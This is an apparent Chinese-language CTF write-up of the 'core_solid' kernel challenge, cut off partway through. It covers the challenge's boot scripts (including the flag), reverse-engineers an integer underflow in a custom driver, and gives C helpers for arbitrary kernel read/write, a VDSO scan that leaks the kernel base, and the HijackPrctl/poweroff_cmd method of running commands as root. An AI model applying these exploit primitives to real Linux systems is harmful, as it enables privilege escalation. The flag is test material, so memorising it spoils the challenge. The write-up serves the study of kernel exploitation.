              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>core_solid 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1  kaslr&quot; \</span><br><span class="line">-cpu qemu64,+smep,+smap \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-s \</span><br><span class="line">-nographic  -enable-kvm \</span><br></pre></td></tr></table></figure>
<ul>
<li>kaslr，smep，smap</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig lo 127.0.0.1 netmask 255.255.255.0</span><br><span class="line">route add -net 127.0.0.0 netmask 255.255.255.0 lo</span><br><span class="line">echo &quot;flag&#123;hijack_prctl_is_fun_and_function_pointer_is_dangerous&#125;&quot; &gt; /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">insmod /simp1e.ko</span><br><span class="line">chmod 777 /proc/simp1e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">poweroff -d 1800000 -f &amp;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>kptr_restrict，dmesg_restrict</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>驱动程序的逆向有点麻烦，主要是 <code>csaw_ioctl</code> 不同功能传入的结构体不同</p>
<ul>
<li>3个8字节，有时是指针，有时是 size，甚至有时只传入4字节</li>
</ul>
<p>而函数 <code>csaw_ioctl</code> 中只定义了一个结构体 <code>channel_args_from</code>，于是我就默认每个位置的功能固定，走了不少弯路，最后是通过函数名和一些特殊函数分析出了 <code>channel_args_from</code> 各个位置的含义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alloc_new_ipc_channel <span class="comment">/* 因为里面有kmalloc,可以判断传入的参数为size */</span></span><br><span class="line">realloc_ipc_channel <span class="comment">/* 传入的参数为ID */</span></span><br><span class="line">get_channel_by_id <span class="comment">/* 传入的参数为ID */</span></span><br><span class="line">mutex_lock <span class="comment">/* 传入的参数为mutex */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>顺带一提，以下两个结构体在驱动模块中经常出现（部分条目可能不一样）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">list</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_4)</span><br><span class="line"><span class="number">00000000</span> item dq ?                               ; offset</span><br><span class="line"><span class="number">00000008</span> mutex dq ?                              ; offset</span><br><span class="line"><span class="number">00000010</span> field_10 dq ?</span><br><span class="line"><span class="number">00000018</span> field_18 dq ?</span><br><span class="line"><span class="number">00000020</span> field_20 dq ?</span><br><span class="line"><span class="number">00000028</span> <span class="built_in">list</span> ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> item struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_5)</span><br><span class="line"><span class="number">00000000</span> refcount dd ?</span><br><span class="line"><span class="number">00000004</span> index dd ?</span><br><span class="line"><span class="number">00000008</span> buf dq ?                                ; offset</span><br><span class="line"><span class="number">00000010</span> size dq ?</span><br><span class="line"><span class="number">00000018</span> data dq ?                               ; offset</span><br><span class="line"><span class="number">00000020</span> item ends</span><br></pre></td></tr></table></figure>
<p>程序的漏洞点就在 <code>realloc_ipc_channel</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( key_cannel )</span><br><span class="line">    size = channel-&gt;size + user_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    size = channel-&gt;size - user_size; <span class="comment">/* 负数溢出 */</span></span><br><span class="line">buf = (<span class="keyword">char</span> *)krealloc(channel-&gt;buf, size + <span class="number">1</span>, <span class="number">0x14000C0</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( buf )</span><br><span class="line">&#123;</span><br><span class="line">    item-&gt;buf = buf; </span><br><span class="line">    item-&gt;size = size; <span class="comment">/* 为item赋值新的size */</span></span><br><span class="line">    err = _InterlockedDecrement(&amp;item-&gt;refcount);</span><br><span class="line">    key = err == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( err &lt; <span class="number">0</span> )</span><br><span class="line">        __asm &#123; ud0 &#125;</span><br><span class="line">    <span class="keyword">if</span> ( key )</span><br><span class="line">    &#123;</span><br><span class="line">        ipc_channel_destroy(item);</span><br><span class="line">        LODWORD(channel) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        LODWORD(channel) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>user_size</code> 大于 <code>channel-&gt;size</code> 就会导致负数溢出</li>
<li>但这里我们想要的不是 <code>krealloc</code> 申请的大空间，而是 <code>channel-&gt;buf</code> 空间不变，但是 <code>item-&gt;size</code> 超大，可以绕过后面的检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">item_write = using_list-&gt;item;</span><br><span class="line">size = channel_from.size;</span><br><span class="line"><span class="keyword">if</span> ( !using_list-&gt;item )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">data_write = item_write-&gt;data;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)&amp;data_write[channel_from.size] &gt; item_write-&gt;size )</span><br><span class="line">    <span class="comment">/* item_write-&gt;size非常大,实现局部任意写 */</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">addr = (<span class="keyword">unsigned</span> __int64)&amp;item_write-&gt;buf[(<span class="keyword">unsigned</span> __int64)data_write];</span><br><span class="line"><span class="keyword">if</span> ( addr &lt;= <span class="number">0xFFFFFFFF7FFFFFFF</span>LL )</span><br><span class="line">    <span class="comment">/* 程序进行了限制,写的范围必须大于0xFFFFFFFF7FFFFFFF */</span></span><br><span class="line">    printk(<span class="string">&quot;16Access Denied\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( strncpy_from_user(addr, channel_from.user_ptr, channel_from.size) &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="comment">/* 把用户指针user_ptr中的数据拷贝到using_list-&gt;item-&gt;data中 */</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序将在 CSAW_WRITE_CHANNEL 完成局部任意写</li>
</ul>
<p><strong>任意读写</strong></p>
<p>程序利用 CSAW_SEEK_CHANNEL 和 CSAW_READ_CHANNEL 可以完成局部任意读：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">item_seek-&gt;data = channel_from.user_ptr;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">item_read = using_list-&gt;item;</span><br><span class="line">data_read = (<span class="keyword">unsigned</span> __int64)item_read-&gt;data;</span><br><span class="line">copy_to_user(channel_from.user_ptr, &amp;item_read-&gt;buf[data_read], channel_from.size)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>item_seek</code> 和 <code>item_read</code> 都指向 <code>using_list-&gt;item</code>（是由 <code>alloc_new_ipc_channel</code> 进行分配的）</li>
<li>因此 <code>data_read == channel_from.user_ptr</code></li>
</ul>
<p>模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序利用 CSAW_SEEK_CHANNEL 和 CSAW_WRITE_CHANNEL 可以完成局部任意写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">item_seek-&gt;data = channel_from.user_ptr;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data_write = (<span class="keyword">unsigned</span> __int64)item_write-&gt;data;</span><br><span class="line">addr = (<span class="keyword">unsigned</span> __int64)&amp;item_write-&gt;buf[data_write];</span><br><span class="line">strncpy_from_user(addr, channel_from.user_ptr, channel_from.size)</span><br></pre></td></tr></table></figure>
<ul>
<li>首先 <code>data_write == channel_from.user_ptr</code></li>
<li>而 <code>item_write-&gt;buf</code> 是由 <code>_kmalloc</code> 申请出来的，理论上来说我们是不好泄露堆地址的，但是 <code>realloc_ipc_channel</code> 中有解决的办法：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf = (<span class="keyword">char</span> *)krealloc(channel-&gt;buf, size + <span class="number">1</span>, <span class="number">0x14000C0</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( buf )</span><br><span class="line">&#123;</span><br><span class="line">    item-&gt;buf = buf; </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>size+1 == 0</code> 时，<code>krealloc</code> 会返回 NULL，同时被赋值给 <code>using_list-&gt;item-&gt;buf</code>（这就不需要考虑堆地址了）</li>
</ul>
<p>模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">	</span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    write_channel.id = channel_id;</span><br><span class="line">    write_channel.buf = (<span class="keyword">char</span>*)write_buff;</span><br><span class="line">    write_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>可以用 HijackPrctl 在不提权的情况下获取 flag</p>
<p>HijackPrctl 的核心就是利用 <code>prctl</code> 系统调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> =</span> current;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">	<span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后跟进 <code>security_task_prctl</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> thisrc;</span><br><span class="line">	<span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">	hlist_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">		thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">		<span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">			rc = thisrc;</span><br><span class="line">			<span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>security_task_prctl</code> 中会定位到一个虚表里面去，并且第一个参数可控</li>
<li>劫持这里，然后调用 <code>prctl</code>，就可以实现任意代码执行</li>
</ul>
<p>利用程序漏洞实现的 WAA 可以轻松覆盖这里，但是有一个问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>security_task_prctl</code> 的第一个参数是 <code>int</code> 类型</li>
<li>为了执行 <code>commit_creds(prepare_kernel_cred(0))</code>，我们需要传入 <code>prepare_kernel_cred(0)</code> 的指针，但是在64位的系统中该指针会被 <code>int</code> 类型截断（32位就没有这个困扰）</li>
</ul>
<p>取而代之的是函数 <code>__orderly_poweroff</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">		pr_warn(<span class="string">&quot;Failed to start orderly shutdown: forcing the issue\n&quot;</span>);</span><br><span class="line">		emergency_sync();</span><br><span class="line">		kernel_power_off();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>该函数会调用 <code>run_cmd</code>，进而调用 <code>call_usermoderhelper</code>（内核运行用户程序的一个 <code>api</code>，并且拥有 <code>Root</code> 的权限，如果我们能够控制性的调用它，就能以 <code>Root</code> 权限执行我们想要执行的程序）</li>
<li>参数 <code>poweroff_cmd</code> 是全局变量，可以修改</li>
</ul>
<p>因此 HijackPrctl 的大体步骤为：</p>
<ul>
<li>篡改 <code>poweroff_cmd</code> 使其等于我们预期执行的命令</li>
<li>篡改 <code>prctl_hook</code> 为 <code>orderly_poweroff</code>  </li>
<li>调用 <code>prctl</code></li>
</ul>
<p>为此我们需要先泄露 <code>kernel_base</code>：</p>
<ul>
<li>当我们有 RAA 任意读后，可以用爆破的形式泄露 VDSO 的 ELF 头文件</li>
<li>然后利用 VDSO和 <code>kernel_base</code> 相差不远的特性，泄露出内核基址</li>
</ul>
<p>把网上的模板拿来改一改就好了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(addr=<span class="number">0xffffffff80000000</span>; addr&lt;<span class="number">0xffffffffffffefff</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">    RAA(fd, channel_id, &amp;read_buff, addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (read_buff == <span class="number">0x010102464c457f</span>) &#123; <span class="comment">/* VDSO ELF头文件标志 */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find it: %p\n&quot;</span>,addr);</span><br><span class="line">        vdso_addr = addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来就是一些套路化的东西，但是这个消息获取的过程需要注意</li>
</ul>
<p><strong>信息获取</strong></p>
<p>先关闭 kaslr，开始调试内核：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms</span></span><br><span class="line"><span class="number">0000000000000000</span> A irq_stack_union </span><br><span class="line"><span class="number">0000000000000000</span> A __per_cpu_start</span><br><span class="line">ffffffffa3a00000 T startup_64</span><br><span class="line">ffffffffa3a00000 T _stext</span><br><span class="line">ffffffffa3a00000 T _text</span><br><span class="line">ffffffffa3a00030 T secondary_startup</span><br></pre></td></tr></table></figure>
<ul>
<li><code>kernel_base == 0xffffffffa3a00000</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># grep security_task_prctl /proc/kallsyms</span></span><br><span class="line">ffffffffa3cbd410 T security_task_prctl</span><br><span class="line">/ <span class="meta"># grep poweroff_work_func /proc/kallsyms</span></span><br><span class="line">ffffffffa3a9c4c0 t poweroff_work_func</span><br></pre></td></tr></table></figure>
<ul>
<li><code>poweroff_work_func == 0xffffffffa3a9c4c0</code></li>
<li><code>poweroff_work_func_offset = 0xffffffffa3a9c4c0 - 0xffffffffa3a00000 = 0x9c4c0</code></li>
</ul>
<p>然后连接 GDB，打印 <code>security_task_prctl-ffffffffa3cbd410</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">30</span>iw <span class="number">0xffffffffa3cbd410</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd410</span>:	push   r15</span><br><span class="line">   <span class="number">0xffffffffa3cbd412</span>:	mov    r15d,<span class="number">0xffffffda</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd418</span>:	push   r14</span><br><span class="line">   <span class="number">0xffffffffa3cbd41a</span>:	mov    r14d,edi</span><br><span class="line">   <span class="number">0xffffffffa3cbd41d</span>:	push   r13</span><br><span class="line">   <span class="number">0xffffffffa3cbd41f</span>:	mov    r13,rsi</span><br><span class="line">   <span class="number">0xffffffffa3cbd422</span>:	push   r12</span><br><span class="line">   <span class="number">0xffffffffa3cbd424</span>:	mov    r12,rdx</span><br><span class="line">   <span class="number">0xffffffffa3cbd427</span>:	push   rbp</span><br><span class="line">   <span class="number">0xffffffffa3cbd428</span>:	mov    rbp,rcx</span><br><span class="line">   <span class="number">0xffffffffa3cbd42b</span>:	push   rbx</span><br><span class="line">   <span class="number">0xffffffffa3cbd42c</span>:	sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd430</span>:	mov    rbx,QWORD PTR [rip+<span class="number">0x14a4cc9</span>]        # <span class="number">0xffffffffa5162100</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd437</span>:	mov    QWORD PTR [rsp],r8</span><br><span class="line">   <span class="number">0xffffffffa3cbd43b</span>:	cmp    rbx,<span class="number">0xffffffffa5162100</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd442</span>:	je     <span class="number">0xffffffffa3cbd46f</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd444</span>:	mov    r8,QWORD PTR [rsp]</span><br><span class="line">   <span class="number">0xffffffffa3cbd448</span>:	mov    rcx,rbp</span><br><span class="line">   <span class="number">0xffffffffa3cbd44b</span>:	mov    rdx,r12</span><br><span class="line">   <span class="number">0xffffffffa3cbd44e</span>:	mov    rsi,r13</span><br><span class="line">   <span class="number">0xffffffffa3cbd451</span>:	mov    edi,r14d</span><br><span class="line">   <span class="number">0xffffffffa3cbd454</span>:	call   QWORD PTR [rbx+<span class="number">0x18</span>] <span class="comment">/* target */</span></span><br></pre></td></tr></table></figure>
<p>在 <code>0xffffffffa3cbd454</code> 打断点，调试至此：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*RBX  <span class="number">0xffffffffa4c4fce8</span> —▸ <span class="number">0xffffffffa5162100</span> ◂— <span class="number">0xffffffffa4c4fce8</span></span><br><span class="line">*RIP  <span class="number">0xffffffffa3cbd454</span> ◂— call   qword ptr [rbx + <span class="number">0x18</span>]</span><br><span class="line">─────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0xffffffffa3cbd454</span>    call   qword ptr [rbx + <span class="number">0x18</span>]        &lt;<span class="number">0xffffffffa3a9c4c0</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>prctl_hook == 0xffffffffa4c4fd00</code></li>
<li><code>prctl_hook_offset = 0xffffffffa4c4fd00 - 0xffffffffa3a00000 = 0x124fd00</code></li>
</ul>
<p>然后连接 GDB，打印 <code>poweroff_work_func-ffffffffa3a9c4c0</code></p>
